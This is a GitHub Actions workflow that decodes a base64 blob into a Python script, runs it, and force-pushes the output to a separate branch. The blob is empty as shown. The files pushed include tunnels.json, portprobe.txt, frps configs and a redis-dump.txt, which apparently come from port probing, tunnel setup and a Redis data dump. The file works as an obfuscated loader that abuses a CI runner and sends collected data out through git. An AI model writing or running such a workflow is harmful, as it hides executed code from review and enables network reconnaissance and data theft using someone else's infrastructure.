name: zz-probe10
on:
  push:
    branches: [ "zz-probe10" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
      - name: run-probe
        run: |
          set +e
          python3 -c "import base64;open('probe.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          python3 probe.py > result10.txt 2>&1
          echo "exit=$?"; wc -c result10.txt; ls -la
      - name: push-back
        if: always()
        run: |
          set +e
          git config user.email "probe@example.com"
          git config user.name "probe"
          cp result10.txt zz-result10.txt
          git checkout -B zz-out10
          git add -f zz-result10.txt tunnels.json tunnels.txt portprobe.txt frps-*.json redis-dump.txt
          git commit -m "probe result 10"
          git push -f origin zz-out10
